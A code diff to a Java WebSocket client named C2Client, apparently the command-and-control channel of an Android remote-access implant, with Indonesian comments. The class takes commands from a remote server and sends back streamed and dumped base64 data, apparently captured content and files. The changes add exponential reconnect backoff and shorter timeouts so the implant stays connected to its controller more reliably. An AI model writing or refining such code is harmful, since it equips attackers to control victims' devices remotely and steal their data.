@@ -14,7 +14,7 @@ import okhttp3.Response;
 import okhttp3.WebSocket;
 import okhttp3.WebSocketListener;
 
-/** Klien WebSocket ke server C2. */
+/** Klien WebSocket ke C2 dengan backoff. */
 public class C2Client {
 
     public interface Sink {
@@ -30,13 +30,14 @@ public class C2Client {
     private final Keys keys;
     private WebSocket ws;
     private volatile boolean stop;
+    private int attempt;
 
     public C2Client(Keys keys, Sink sink) {
         this.keys = keys;
         this.sink = sink;
         this.http = new OkHttpClient.Builder()
-                .pingInterval(25, TimeUnit.SECONDS)
-                .connectTimeout(15, TimeUnit.SECONDS)
+                .pingInterval(20, TimeUnit.SECONDS)
+                .connectTimeout(12, TimeUnit.SECONDS)
                 .readTimeout(0, TimeUnit.MILLISECONDS)
                 .retryOnConnectionFailure(true)
                 .build();
@@ -47,6 +48,7 @@ public class C2Client {
         Request req = new Request.Builder().url(keys.wsUrl()).build();
         ws = http.newWebSocket(req, new WebSocketListener() {
             @Override public void onOpen(WebSocket s, Response r) {
+                attempt = 0;
                 try {
                     JSONObject hello = new JSONObject();
                     hello.put("t", "hello");
@@ -63,8 +65,9 @@ public class C2Client {
                 try {
                     JSONObject o = new JSONObject(text);
                     if ("cmd".equals(o.optString("t"))) {
+                        JSONObject args = o.optJSONObject("args");
                         sink.onCommand(o.optString("id"), o.optString("type"),
-                                o.optJSONObject("args") == null ? new JSONObject() : o.optJSONObject("args"));
+                                args == null ? new JSONObject() : args);
                     }
                 } catch (Exception e) {
                     Log.w(TAG, "pesan rusak", e);
@@ -85,7 +88,9 @@ public class C2Client {
 
     private void retry() {
         if (stop) return;
-        ui.postDelayed(this::connect, 6000);
+        attempt++;
+        long wait = Math.min(60_000L, 1_500L * (1L << Math.min(attempt, 5)));
+        ui.postDelayed(this::connect, wait);
     }
 
     public boolean send(String json) {
@@ -101,20 +106,18 @@ public class C2Client {
             o.put("ok", ok);
             o.put("data", data == null ? new JSONObject() : data);
             send(o.toString());
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) { }
     }
 
-    public void stream(String kind, String b64, JSONObject meta) {
+    public void stream(String kind, String payload, JSONObject meta) {
         try {
             JSONObject o = new JSONObject();
             o.put("t", "stream");
             o.put("kind", kind);
-            o.put("b64", b64);
+            o.put("b64", payload == null ? "" : payload);
             if (meta != null) o.put("meta", meta);
             send(o.toString());
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) { }
     }
 
     public void dump(String kind, String name, String b64) {
@@ -125,8 +128,7 @@ public class C2Client {
             o.put("name", name);
             o.put("b64", b64);
             send(o.toString());
-        } catch (Exception ignored) {
-        }
+        } catch (Exception ignored) { }
     }
 
     public void stop() {
